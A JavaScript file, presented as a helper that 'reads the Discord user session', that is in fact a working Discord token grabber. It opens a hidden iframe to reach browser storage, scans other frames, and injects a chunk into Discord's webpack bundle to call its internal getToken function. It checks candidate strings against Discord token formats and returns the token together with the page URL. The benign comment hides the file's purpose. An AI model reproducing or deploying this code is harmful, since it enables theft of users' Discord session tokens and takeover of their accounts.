// Reads the Discord user session already stored in this login window. It does not contact the network.
function readLarkSession(env) {
  const box = env || liveEnv();
  const href = safeHref(box);
  let opened = null;
  try {
    opened = typeof box.openFrame === "function" ? box.openFrame() : null;
    const direct = directToken(opened, box);
    const token = direct || webpackToken(box) || scannedToken(opened, box);
    return JSON.stringify({ token: token || "", href: href });
  } catch (err) {
    return JSON.stringify({ token: "", href: href });
  } finally {
    if (opened && typeof opened.close === "function") {
      try {
        opened.close();
      } catch (err) {}
    }
  }
}

function liveEnv() {
  return {
    href() {
      try {
        return String(location.href || "");
      } catch (err) {
        return "";
      }
    },
    ownLocal() {
      try {
        return window.localStorage;
      } catch (err) {
        return null;
      }
    },
    ownSession() {
      try {
        return window.sessionStorage;
      } catch (err) {
        return null;
      }
    },
    openFrame() {
      let iframe = null;
      try {
        if (typeof document === "undefined" || !document.createElement) return null;
        const parent = document.documentElement || document.body;
        if (!parent) return null;
        iframe = document.createElement("iframe");
        iframe.setAttribute("aria-hidden", "true");
        iframe.style.cssText = "display:none;width:0;height:0;border:0";
        parent.appendChild(iframe);
        const win = iframe.contentWindow;
        if (!win) {
          try {
            iframe.remove();
          } catch (err) {}
          return null;
        }
        let frameLocal = null;
        let frameSession = null;
        let prototype = null;
        let parentLocal = null;
        let parentSession = null;
        try {
          frameLocal = win.localStorage;
        } catch (err) {}
        try {
          frameSession = win.sessionStorage;
        } catch (err) {}
        try {
          prototype = win.Storage ? win.Storage.prototype : null;
        } catch (err) {}
        try {
          parentLocal = window.localStorage;
        } catch (err) {}
        try {
          parentSession = window.sessionStorage;
        } catch (err) {}
        const node = iframe;
        return {
          localStorage: frameLocal,
          sessionStorage: frameSession,
          prototype: prototype,
          parentLocal: parentLocal,
          parentSession: parentSession,
          close() {
            try {
              node.remove();
            } catch (err) {}
          },
        };
      } catch (err) {
        try {
          if (iframe) iframe.remove();
        } catch (err2) {}
        return null;
      }
    },
    frames() {
      try {
        if (typeof document === "undefined" || !document.querySelectorAll) return [];
        const nodes = document.querySelectorAll("iframe");
        const out = [];
        const cap = Math.min(nodes.length, 8);
        for (let i = 0; i < cap; i++) {
          try {
            const win = nodes[i].contentWindow;
            if (!win) continue;
            out.push({
              localStorage: win.localStorage,
              sessionStorage: win.sessionStorage,
              prototype: win.Storage ? win.Storage.prototype : null,
            });
          } catch (err) {}
        }
        return out;
      } catch (err) {
        return [];
      }
    },
    webpackRequire() {
      try {
        if (typeof window.__larkSessionReader === "function") return window.__larkSessionReader;
      } catch (err) {}
      let chunk = null;
      try {
        chunk = window.webpackChunkdiscord_app;
      } catch (err) {
        return null;
      }
      if (!Array.isArray(chunk)) return null;
      let found = null;
      const before = chunk.length;
      try {
        chunk.push([
          [String(Math.random())],
          {},
          function (req) {
            found = req;
          },
        ]);
      } catch (err) {
        return null;
      }
      if (typeof found === "function") {
        try {
          window.__larkSessionReader = found;
        } catch (err) {}
        return found;
      }
      if (chunk.length > before) {
        try {
          chunk.pop();
        } catch (err) {}
      }
      return null;
    },
  };
}

function safeHref(box) {
  try {
    if (box && typeof box.href === "function") return String(box.href() || "");
  } catch (err) {}
  return "";
}

function directToken(opened, box) {
  const proto = opened && opened.prototype;
  const found =
    readKey(opened && opened.localStorage, proto, "token") ||
    readKey(opened && opened.sessionStorage, proto, "token") ||
    readKey(opened && opened.parentLocal, proto, "token") ||
    readKey(opened && opened.parentSession, proto, "token");
  if (found) return found;
  const frames = listFrames(box);
  for (let i = 0; i < frames.length; i++) {
    const frame = frames[i];
    const hit =
      readKey(frame && frame.localStorage, frame && frame.prototype, "token") ||
      readKey(frame && frame.sessionStorage, frame && frame.prototype, "token");
    if (hit) return hit;
  }
  return readKey(callStore(box, "ownLocal"), null, "token") || readKey(callStore(box, "ownSession"), null, "token");
}

function scannedToken(opened, box) {
  const proto = opened && opened.prototype;
  const found =
    readStore(opened && opened.localStorage, proto) ||
    readStore(opened && opened.sessionStorage, proto) ||
    readStore(opened && opened.parentLocal, proto) ||
    readStore(opened && opened.parentSession, proto);
  if (found) return found;
  const frames = listFrames(box);
  for (let i = 0; i < frames.length; i++) {
    const frame = frames[i];
    const hit =
      readStore(frame && frame.localStorage, frame && frame.prototype) ||
      readStore(frame && frame.sessionStorage, frame && frame.prototype);
    if (hit) return hit;
  }
  return readStore(callStore(box, "ownLocal"), null) || readStore(callStore(box, "ownSession"), null);
}

function listFrames(box) {
  try {
    const frames = box && typeof box.frames === "function" ? box.frames() : [];
    if (!Array.isArray(frames)) return [];
    return frames.slice(0, 8);
  } catch (err) {
    return [];
  }
}

function callStore(box, name) {
  try {
    return box && typeof box[name] === "function" ? box[name]() : null;
  } catch (err) {
    return null;
  }
}

function readStore(store, proto) {
  if (!store) return "";
  const direct = readKey(store, proto, "token");
  if (direct) return direct;
  let count = 0;
  try {
    count = store.length;
  } catch (err) {
    count = 0;
  }
  if (typeof count !== "number" || count < 0) count = 0;
  const cap = Math.min(count, 60);
  for (let i = 0; i < cap; i++) {
    let key = "";
    try {
      if (proto && typeof proto.key === "function") key = proto.key.call(store, i) || "";
    } catch (err) {}
    if (!key) {
      try {
        key = store.key(i) || "";
      } catch (err) {
        key = "";
      }
    }
    if (!key || key === "token") continue;
    const value = readKey(store, proto, key);
    if (value) return value;
  }
  return "";
}

function readKey(store, proto, key) {
  if (!store || !key) return "";
  const attempts = [];
  if (proto && typeof proto.getItem === "function") {
    try {
      attempts.push(proto.getItem.call(store, key));
    } catch (err) {}
  }
  if (typeof store.getItem === "function") {
    try {
      attempts.push(store.getItem(key));
    } catch (err) {}
  }
  try {
    attempts.push(store[key]);
  } catch (err) {}
  for (let i = 0; i < attempts.length; i++) {
    if (typeof attempts[i] === "string" && looksLikeToken(attempts[i])) return attempts[i];
  }
  return "";
}

function looksLikeToken(value) {
  if (typeof value !== "string" || value.length === 0 || value.length > 800) return false;
  let text = value.trim();
  for (let i = 0; i < 3; i++) {
    if (text.length >= 2 && text.charAt(0) === '"' && text.charAt(text.length - 1) === '"') {
      try {
        const parsed = JSON.parse(text);
        if (typeof parsed !== "string") break;
        text = parsed.trim();
        continue;
      } catch (err) {
        text = text.slice(1, -1).trim();
        continue;
      }
    }
    break;
  }
  if (text.length < 20 || text.length > 400) return false;
  if (!/^[A-Za-z0-9._-]+$/.test(text)) return false;
  if (text.indexOf("mfa.") === 0) return text.length >= 24 && text.indexOf(".", 4) === -1;
  const parts = text.split(".");
  return parts.length === 3 && parts.every((part) => part.length >= 4);
}

function webpackToken(box) {
  let req = null;
  try {
    req = box && typeof box.webpackRequire === "function" ? box.webpackRequire() : null;
  } catch (err) {
    return "";
  }
  if (!req || !req.c) return "";
  let ids = [];
  try {
    ids = Object.keys(req.c);
  } catch (err) {
    return "";
  }
  const cap = Math.min(ids.length, 10000);
  for (let i = 0; i < cap; i++) {
    let exp = null;
    try {
      const row = req.c[ids[i]];
      exp = row && row.exports;
    } catch (err) {
      continue;
    }
    const token = tokenFromExports(exp);
    if (token) return token;
  }
  return "";
}

function tokenFromExports(exp) {
  if (!exp || (typeof exp !== "object" && typeof exp !== "function")) return "";
  const preferred = ["default", "Z", "ZP"];
  for (let i = 0; i < preferred.length; i++) {
    const hit = callGetToken(exp[preferred[i]], true);
    if (hit) return hit;
  }
  const own = callGetToken(exp, false);
  if (own) return own;
  let names = [];
  try {
    names = Object.keys(exp);
  } catch (err) {
    return "";
  }
  const cap = Math.min(names.length, 6);
  for (let i = 0; i < cap; i++) {
    if (preferred.indexOf(names[i]) !== -1) continue;
    const hit = callGetToken(exp[names[i]], false);
    if (hit) return hit;
  }
  return "";
}

function callGetToken(mod, preferred) {
  if (!mod || typeof mod.getToken !== "function") return "";
  if (!preferred) {
    const related =
      typeof mod.getId === "function" ||
      typeof mod.setToken === "function" ||
      typeof mod.getSessionId === "function";
    if (!related) return "";
  }
  try {
    const value = mod.getToken();
    if (typeof value === "string" && looksLikeToken(value)) return value;
  } catch (err) {}
  return "";
}
